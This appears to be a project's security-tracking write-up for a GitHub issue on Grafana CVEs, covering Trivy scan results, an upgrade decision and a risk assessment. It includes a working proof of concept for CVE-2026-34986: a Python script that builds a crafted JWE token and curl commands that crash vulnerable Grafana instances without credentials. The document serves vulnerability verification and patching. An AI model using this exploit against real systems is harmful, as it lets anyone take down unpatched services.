# Issue #434: Grafana CVEs after upgrade to 12.4.2

**GitHub**: <https://github.com/torrust/torrust-tracker-deployer/issues/434>
**Image**: `grafana/grafana:12.4.2`
**Default set in**: `src/domain/grafana/config.rs`

---

## Context

After PR #436 upgraded Grafana from `12.3.1` to `12.4.2`:

| Version  | HIGH | CRITICAL |
| -------- | ---- | -------- |
| `12.3.1` | 18   | 6        |
| `12.4.2` | 4    | 0        |

CRITICALs are fully cleared. 4 HIGH remain in upstream binary dependencies.

## Decision

**Re-scan with latest Grafana tag, then decide**:

- If a newer tag clears remaining HIGH: upgrade, update scan doc, close #434
- If not: post comment with scan results confirming no CRITICALs, document accepted
  risk, close #434

## Steps

- [x] Check the latest Grafana release:
      <https://hub.docker.com/r/grafana/grafana/tags>
- [x] Run Trivy against the latest tag:
      `trivy image --severity HIGH,CRITICAL grafana/grafana:LATEST_TAG`
- [x] Compare results against the 12.4.2 baseline in
      `docs/security/docker/scans/grafana.md`
- [ ] **If a newer tag reduces HIGH count**: update `src/domain/grafana/config.rs`
      and the CI scan matrix; update the scan doc; post results comment; close #434
- [x] **If no improvement**: post comment with current scan output confirming
      no CRITICALs and document accepted risk for remaining HIGH; close #434

## Outcome

- Date: 2026-04-14
- Grafana tags tested: `12.4.2` (13 HIGH, 0 CRITICAL) and `13.0.0` (10 HIGH, 0 CRITICAL)
- Decision: **upgrade to `grafana/grafana:13.0.0`** — fixes CVE-2026-34986 (remote DoS)
- Action: Updated `src/domain/grafana/config.rs` to `grafana/grafana:13.0.0`
- Comment: posted on issue #434

### Scan details — `grafana/grafana:12.4.2` (Trivy, 2026-04-14)

| Component                  | HIGH   | CRITICAL |
| -------------------------- | ------ | -------- |
| Alpine 3.23.3 (OS)         | 3      | 0        |
| `grafana` binary (Go deps) | 6      | 0        |
| `grafana-cli` binary       | 2      | 0        |
| `grafana-server` binary    | 2      | 0        |
| **Total**                  | **13** | **0**    |

**Alpine OS CVEs (all `fixed` in newer Alpine, blocked on Grafana rebuilding):**

| CVE            | Package              | Severity | Fix      |
| -------------- | -------------------- | -------- | -------- |
| CVE-2026-28390 | libcrypto3 / libssl3 | HIGH     | 3.5.6-r0 |
| CVE-2026-22184 | zlib                 | HIGH     | 1.3.2-r0 |

**Go binary CVEs (all `fixed` in newer upstream versions, blocked on Grafana updating):**

| CVE            | Library            | Severity | Fix             |
| -------------- | ------------------ | -------- | --------------- |
| CVE-2026-34986 | go-jose/go-jose/v4 | HIGH     | 4.1.4           |
| CVE-2026-34040 | moby/moby          | HIGH     | 29.3.1          |
| CVE-2026-24051 | otel/sdk           | HIGH     | 1.40.0          |
| CVE-2026-39883 | otel/sdk           | HIGH     | 1.43.0          |
| CVE-2026-32280 | stdlib             | HIGH     | 1.25.9 / 1.26.2 |
| CVE-2026-32282 | stdlib             | HIGH     | 1.25.9 / 1.26.2 |

### CVE-2026-34986 — remotely exploitable DoS (highest risk)

**Advisory**: [GHSA-78h2-9frx-2jm8](https://github.com/go-jose/go-jose/security/advisories/GHSA-78h2-9frx-2jm8)
**CVSS**: 7.5 High — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
**Root cause**: Dependency issue in `go-jose/go-jose/v4` (not Grafana's own code).
**Mechanism**: If Grafana receives a JWE token whose `alg` field names a key-wrapping
algorithm (e.g. `A128KW`) but with an empty `encrypted_key`, go-jose panics trying to
allocate a zero-length slice in `cipher.KeyUnwrap()`. The panic crashes the goroutine
and can bring down the Grafana process entirely.

**Is it exploitable via the public dashboard?** Yes. Grafana parses bearer tokens on
all HTTP requests before checking authentication. An attacker can send:

```text
Authorization: Bearer <crafted-JWE-with-empty-encrypted_key>
```

to any endpoint on `grafana.torrust-tracker-demo.com` without any credentials and
crash Grafana. The CVSS confirms this: no privileges required, no user interaction,
network-reachable.

**Grafana's fix**: merged in PR
[grafana/grafana#121830](https://github.com/grafana/grafana/pull/121830) 2 weeks
ago, bumping `go-jose/v4` to `4.1.4`. The PR targets milestone **13.0.x** and is
labelled `no-backport` — **no fix will be released for any 12.x version**.

**Status**: Fixed in `grafana/grafana:13.0.0` (bumped `go-jose/v4` to `4.1.4` via PR
[grafana/grafana#121830](https://github.com/grafana/grafana/pull/121830)).
`src/domain/grafana/config.rs` updated to `grafana/grafana:13.0.0`.

#### Proof-of-concept

> ⚠️ **Run against a local instance first.** Sending this to the live demo will
> crash the public Grafana at `grafana.torrust-tracker-demo.com` until Docker
> restarts it.

##### Step 1 — Generate the crafted JWE token

The JWE compact serialisation has five base64url segments separated by `.`:

```text
<header>.<encrypted_key>.<iv>.<ciphertext>.<tag>
```

The panic is triggered by setting `alg` to a KW algorithm and leaving
`encrypted_key` (segment 2) empty.

```python
# generate-jwe-poc.py
import base64, json

header = {"alg": "A128KW", "enc": "A128CBC-HS256"}
header_b64 = (
    base64.urlsafe_b64encode(
        json.dumps(header, separators=(",", ":")).encode()
    )
    .rstrip(b"=")
    .decode()
)

# JWE compact: <header>.<encrypted_key>.<iv>.<ciphertext>.<tag>
# Leave encrypted_key empty — this is the trigger.
jwe = f"{header_b64}..AAAA.AAAA.AAAA"
print(jwe)
```

Run it:

```console
$ python3 generate-jwe-poc.py
eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0..AAAA.AAAA.AAAA
```

##### Step 2 — Send the request

Replace `<TOKEN>` with the output from step 1 and `<HOST>` with either a local
instance or the live demo.

```console
$ TOKEN="eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0..AAAA.AAAA.AAAA"

# Against a local instance (safe — recommended first):
$ curl -si -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/health

# Against the live demo (will cause a brief outage — your own server):
$ curl -si -H "Authorization: Bearer $TOKEN" https://grafana.torrust-tracker-demo.com/api/health
```

##### Expected response from a vulnerable instance (12.4.2)

The HTTP connection drops or Grafana returns a 502 from Caddy because the process
crashed:

```text
HTTP/2 502
content-type: text/html; charset=utf-8
...
<html>Bad Gateway</html>
```

Alternatively the connection resets immediately with no response, depending on how
fast Docker restarts the container.

The Grafana container log shows the panic:

```text
goroutine 1 [running]:
runtime/debug.Stack(...)
    /usr/local/go/src/runtime/debug/stack.go:24
github.com/go-jose/go-jose/v4.(*symmetricKeyCipher).keyUnwrap(...)
    github.com/go-jose/go-jose/v4@v4.1.3/cipher/key_wrap.go:82 +0x...
panic: runtime error: makeslice: len out of range
```

To observe it locally:

```sh
docker logs --follow torrust-grafana 2>&1 | grep -A 10 "panic"
```

##### Expected response from a patched instance (13.0.x / go-jose 4.1.4)

Grafana returns a proper 400 Bad Request without crashing:

```text
HTTP/2 400
content-type: application/json

{"message":"JWE parse failed: go-jose/v4: invalid payload","requestId":"..."}
```

##### Verifying the container recovered

After a crash, Docker's `restart: always` policy brings Grafana back in a few
seconds. Confirm with:

```console
$ docker inspect --format '{{.RestartCount}}' torrust-grafana
1
```

A non-zero restart count confirms the process was killed by the panic.

### Mitigation options

Three options exist for reducing exposure to CVE-2026-34986:

| Option                             | Effort | Completeness | Notes                                                       |
| ---------------------------------- | ------ | ------------ | ----------------------------------------------------------- |
| **Upgrade to 13.0.0** (chosen)     | Low    | Full fix     | `go-jose/v4` bumped to `4.1.4`; DoS eliminated              |
| Caddy WAF rule                     | Medium | Partial      | Block `Authorization` headers matching JWE compact format   |
| Accept risk + rely on auto-restart | None   | None         | Docker `restart: always` recovers single crashes in seconds |

**Upgrade to 13.0.0** is the only complete fix. Grafana labelled the `go-jose` bump
`no-backport`, so 12.x will never receive a patch. `grafana/grafana:13.0.0` was
released on 2026-04-11 and already ships `go-jose/v4 4.1.4`.

**Caddy WAF rule** (interim option, not applied): Caddy can reject requests whose
`Authorization: Bearer` value matches the JWE compact format (five dot-separated
base64url segments). This would block the PoC token before it reaches Grafana.
Not applied here because upgrading to 13.0.0 is available and cleaner.

**Docker restart recovery**: Docker's `restart: always` policy brings Grafana back
in seconds after a single crash. A sustained attack keeps it unavailable for the
duration. This is a recovery mechanism, not a mitigation.

### Scan details — `grafana/grafana:13.0.0` (Trivy, 2026-04-14)

| Component                  | HIGH   | CRITICAL |
| -------------------------- | ------ | -------- |
| Alpine 3.23.3 (OS)         | 3      | 0        |
| `grafana` binary (Go deps) | 2      | 0        |
| `grafana-cli` binary       | 0      | 0        |
| `grafana-server` binary    | 0      | 0        |
| `elasticsearch` plugin     | 5      | 0        |
| **Total**                  | **10** | **0**    |

**Improvements vs 12.4.2**: CVE-2026-34986 (`go-jose`) eliminated; CVE-2026-24051
(`otel/sdk`) and CVE-2026-32280/CVE-2026-32282 (`stdlib`) also fixed. `grafana-cli`
and `grafana-server` are fully clean (0 findings each).

**New in 13.0.0**: The bundled `elasticsearch` datasource plugin binary introduces
5 HIGH CVEs (`otel/sdk` CVE-2026-39883, `stdlib` CVE-2026-25679 / CVE-2026-27137 /
CVE-2026-32280 / CVE-2026-32282). All are local-only — PATH-hijack or
internal-only code paths, not reachable via Grafana's HTTP layer.

**Version comparison:**

| Version  | HIGH   | CRITICAL | CVE-2026-34986 (remote DoS) |
| -------- | ------ | -------- | --------------------------- |
| `12.3.1` | 18     | 6        | present                     |
| `12.4.2` | 13     | 0        | present                     |
| `13.0.0` | **10** | **0**    | **absent**                  |

**Alpine OS CVEs (unchanged — blocked on Grafana rebuilding against Alpine 3.23.6+):**

| CVE            | Package    | Severity | Fix      |
| -------------- | ---------- | -------- | -------- |
| CVE-2026-28390 | libcrypto3 | HIGH     | 3.5.6-r0 |
| CVE-2026-28390 | libssl3    | HIGH     | 3.5.6-r0 |
| CVE-2026-22184 | zlib       | HIGH     | 1.3.2-r0 |

**Go binary CVEs remaining in `grafana` binary:**

| CVE            | Library   | Severity | Fix    | Remote? |
| -------------- | --------- | -------- | ------ | ------- |
| CVE-2026-34040 | moby/moby | HIGH     | 29.3.1 | No      |
| CVE-2026-39883 | otel/sdk  | HIGH     | 1.43.0 | No      |

### Risk assessment for remaining CVEs

All remaining CVEs (10 HIGH, 0 CRITICAL in `grafana/grafana:13.0.0`) require local
access or are not reachable via Grafana's HTTP layer:

| CVE            | Exploitable remotely? | Reason                                                                     |
| -------------- | --------------------- | -------------------------------------------------------------------------- |
| CVE-2026-28390 | No                    | Caddy terminates TLS; Grafana never processes raw TLS                      |
| CVE-2026-22184 | No                    | `untgz` path — unreachable via dashboard UI                                |
| CVE-2026-34040 | No                    | Moby Docker-client code, not a Grafana HTTP endpoint                       |
| CVE-2026-39883 | No                    | Local PATH-hijack — requires host shell access                             |
| CVE-2026-25679 | No                    | `elasticsearch` plugin internal path — not reachable via dashboard         |
| CVE-2026-27137 | No                    | `elasticsearch` plugin internal path — not reachable via dashboard         |
| CVE-2026-32280 | No                    | Go chain-building DoS on outbound TLS — not reachable from public internet |
| CVE-2026-32282 | No                    | Local `Root.Chmod` symlink — requires host shell access                    |

**Overall risk**: CVE-2026-34986 (unauthenticated remote DoS) is eliminated by
upgrading to `grafana/grafana:13.0.0`. The 10 remaining HIGH CVEs have no realistic
remote attack path in this deployment. No CRITICALs in any version we are now
deploying.
